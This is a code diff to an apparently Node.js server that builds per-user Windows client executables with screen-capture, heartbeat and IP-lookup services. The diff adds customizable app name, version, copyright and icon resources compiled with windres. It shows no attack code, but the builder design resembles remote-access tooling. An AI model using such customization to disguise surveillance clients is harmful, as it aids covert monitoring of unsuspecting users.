@@ -14,6 +14,7 @@ const TEMPLATES = {
         source: path.join(BUILDER_DIR, 'scripts/cs'),
         projectFile: 'client.csproj',
         configFile: 'Helpers/Constants.cs',
+        assemblyFile: 'Properties/AssemblyInfo.cs',
         msbuild: {
             outputDir: 'bin/Release',
             outputFile: 'client.exe',
@@ -31,6 +32,7 @@ const TEMPLATES = {
         source: path.join(BUILDER_DIR, 'scripts/cpp'),
         projectFile: 'client.vcxproj',
         configFile: 'helpers/constants.h',
+        assemblyFile: 'client.rc',
         msbuild: {
             outputDir: 'Release',
             outputFile: 'client.exe',
@@ -47,7 +49,8 @@ const TEMPLATES = {
                 'Services/Heartbeat.cpp',
                 'Services/ip_service.cpp',
                 'Services/ScreenCapture.cpp',
-                'network/http_client.cpp'
+                'network/http_client.cpp',
+                'client.res'
             ],
             buildArgs: ['-o', 'client.exe', '-std=c++17', '-O2', '-static', '-lwinhttp', '-lwbemuuid', '-lole32', '-loleaut32', '-luuid', '-lgdiplus', '-lgdi32'],
             restoreArgs: []
@@ -77,7 +80,7 @@ function copyDirSync(src, dest) {
 function injectConfig(filePath, replacements) {
     let content = fs.readFileSync(filePath, 'utf-8');
     for (const [key, value] of Object.entries(replacements)) {
-        content = content.replace(key, value);
+        content = content.replaceAll(key, value);
     }
     fs.writeFileSync(filePath, content);
 }
@@ -163,6 +166,19 @@ exports.startBuild = async (req, res) => {
             '%OWNER_ID%': String(req.user.id)
         });
 
+        const assemblyFilePath = path.join(buildScriptDir, template.assemblyFile);
+        const versionParts = (version || '1.0.0').split('.').map(Number);
+        while (versionParts.length < 3) versionParts.push(0);
+        injectConfig(assemblyFilePath, {
+            '%APP_NAME%': appName || 'DeskrClient',
+            '%DESCRIPTION%': description || '',
+            '%VERSION%': version || '1.0.0',
+            '%COPYRIGHT%': copyright || '',
+            '%VER_MAJOR%': String(versionParts[0]),
+            '%VER_MINOR%': String(versionParts[1]),
+            '%VER_PATCH%': String(versionParts[2])
+        });
+
         writeConfigFile(buildId, { appName, description, copyright, version, icon, apiUrl, language });
 
         if (icon && icon !== 'default') {
@@ -185,6 +201,13 @@ exports.startBuild = async (req, res) => {
                 : [...engineConfig.restoreArgs, projectFilePath];
             const restoreProcess = spawn(BUILD_PATH, restoreArgs, { cwd: buildScriptDir });
             await new Promise((resolve) => restoreProcess.on('close', () => resolve()));
+        }
+
+        if (isMingw) {
+            io.emit('buildProgress', { buildId, progress: 18, message: 'Compiling resources...' });
+            const windres = path.join(path.dirname(MINGW_PATH), 'windres.exe');
+            const windresProcess = spawn(windres, ['client.rc', '-O', 'coff', '-o', 'client.res'], { cwd: buildScriptDir });
+            await new Promise((resolve) => windresProcess.on('close', () => resolve()));
         }
 
         io.emit('buildProgress', { buildId, progress: 20, message: 'Compiling source code...' });
